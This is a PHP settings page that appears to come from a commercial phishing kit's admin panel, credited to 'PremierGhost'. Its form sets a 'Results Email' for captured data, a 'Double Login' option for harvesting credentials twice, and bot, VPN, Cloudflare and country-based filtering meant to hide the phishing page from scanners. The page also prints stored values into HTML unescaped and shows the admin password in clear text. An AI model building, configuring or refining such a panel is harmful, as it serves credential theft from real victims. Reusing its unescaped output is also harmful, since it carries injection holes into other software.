<?php

    session_start();

    if (
        !isset($_SESSION['login']) ||
        !$_SESSION['login']
    ) {
        die(header("Location: ./login.php"));
    }

    $settings = parse_ini_file("../ChangeMe.ini");

?>

<html lang="en">
    <head>
        <meta http-equiv="content-type" content="text/html; charset=UTF-8">
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
        <title>Settings</title>
        <link rel="stylesheet" href="./css/style.css">
        <link rel="stylesheet" href="./css/custom.css">
        <link rel="shortcut icon" href="./img/favicon.svg" type="image/x-icon">
        <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.15.3/css/all.css">
        <link rel="stylesheet" href="http://code.ionicframework.com/ionicons/2.0.1/css/ionicons.min.css">
    </head>
    <body>
        <nav class="navbar navbar-expand-lg navbar-dark py-1 shadow-sm">
            <div class="container">
                <a class="navbar-brand" href="./">
                    <img class="logo-nav" src="./img/logo.svg" alt="">
                </a>
                <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
                    <span class="navbar-toggler-icon"></span>
                </button>
                <div class="collapse navbar-collapse" id="navbarSupportedContent">
                    <ul class="navbar-nav mr-auto">
                        <li class="nav-item">
                            <a class="nav-link" href="./">Home <i class="fad fa-house"></i></a>
                        </li>
                        <li class="nav-item">
                            <a class="nav-link" href="./antibot.php">Antibot <i class="fad fa-robot"></i></a>
                        </li>
                        <li class="nav-item active">
                            <a class="nav-link" href="./settings.php">Settings <i class="fad fa-cog"></i></a>
                        </li>
                    </ul>
                    <ul class="navbar-nav ml-auto">
                        <li class="nav-item">
                            <a class="nav-link" href="./jobs/reset.php?page=settings">Reset Logs <i class="fad fa-trash-alt"></i></a>
                        </li>
                        <li class="nav-item">
                            <a class="nav-link" href="./jobs/logout.php">Logout <i class="fad fa-sign-out"></i></a>
                        </li>
                    </ul>
                </div>
            </div>
        </nav>
        <div class="container mt-4">
            <?php

                if (isset($_SESSION['success'])) {
                    echo '<div class="alert alert-danger shadow-sm fade show"><span>' . $_SESSION['success'] . '</span><button type="button" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">&times;</span></button></div>';
                    unset($_SESSION['success']);
                }

            ?>
            <div class="row mt-3">
                <div class="col-lg-4 col-md-7 col-sm-9 mt-4 mx-auto">
                    <div class="card shadow-sm rounded-0">
                        <div class="card-body">
                            <div class="text-center">
                                <h3 class="font-weight-normal m-0">Page Settings</h3>
                                <span>Update the page settings</span>
                            </div>
                            <form class="m-0" action="./jobs/settings.php" method="POST">
                                <div class="mt-4">
                                    <label>Admin Panel Username</label>
                                    <input type="text" class="form-control" placeholder="Admin Panel Username" name="username" <?php if (isset($settings['Username'])) { echo 'value="' . $settings['Username'] . '"' ; } ?>>
                                </div>
                                <div class="mt-3">
                                    <label>Admin Panel Password</label>
                                    <input type="text" class="form-control" placeholder="Admin Panel Password" name="password" <?php if (isset($settings['Password'])) { echo 'value="' . $settings['Password'] . '"' ; } ?>>
                                </div>
                                <div class="mt-3">
                                    <label>Results Email</label>
                                    <input type="text" class="form-control" placeholder="Results Email" name="email" <?php if (isset($settings['Email'])) { echo 'value="' . $settings['Email'] . '"' ; } ?>>
                                </div>
                                <div class="row">
                                    <div class="col-12">
                                        <label class="ckbox d-flex align-items-center m-0 mt-4">
                                            <input type="checkbox" name="doubleLogin" <?php if (isset($settings['LoginTwice']) && $settings['LoginTwice'] == "on") { echo 'checked' ; } ?>><span>Double Login</span>
                                        </label>
                                    </div>
                                </div>
                                <div class="row">
                                    <div class="col-6 mt-3">
                                        <label class="ckbox d-flex align-items-center m-0 mt-2">
                                            <input type="checkbox" name="vpn" <?php if (isset($settings['VPN']) && $settings['VPN'] == "on") { echo 'checked' ; } ?>><span>VPN Blocking</span>
                                        </label>
                                    </div>
                                    <div class="col-6 mt-3">
                                        <label class="ckbox d-flex align-items-center m-0 mt-2">
                                            <input type="checkbox" name="heuristicvpn" <?php if (isset($settings['HeuristicVPN']) && $settings['HeuristicVPN'] == "on") { echo 'checked' ; } ?>><span>Heuristic VPN Blocking</span>
                                        </label>
                                    </div>
                                </div>
                                <label class="ckbox d-flex align-items-center m-0 mt-2">
                                    <input type="checkbox" name="cfp" <?php if (isset($settings['CFProtection']) && $settings['CFProtection'] == "on") { echo 'checked' ; } ?>><span>CFProtection</span>
                                </label>
                                <div class="mt-4">
                                    <label>Whitelist IP</label>
                                    <input type="text" class="form-control" placeholder="Whitelist IP" name="ip" <?php if (isset($settings['MyIP'])) { echo 'value="' . $settings['MyIP'] . '"' ; } ?>>
                                </div>
                                <div class="mt-3">
                                    <label>Country Lock</label>
                                    <input type="text" class="form-control" placeholder="Country Lock" name="country" <?php if (isset($settings['CountryLock'])) { echo 'value="' . $settings['CountryLock'] . '"' ; } ?>>
                                </div>
                                <button class="btn btn-danger btn-block mt-4" type="submit">Update</button>
                            </form>
                        </div>
                    </div>
                </div>
            </div>
            <div class="text-center my-5">
                <span class="small">
                    <span>Code written by PremierGhost, not for redistribution.</span>
                    <br>
                    <span>Support is not guaranteed if my work is resold.</span>
                    <br>
                    <span>Sincerely, <a class="text-danger" href="https://t.me/PremierGhost" target="_blank">P</a></span>
                </span>
            </div>
        </div>
        <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js"></script>
        <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script>
    </body>
</html>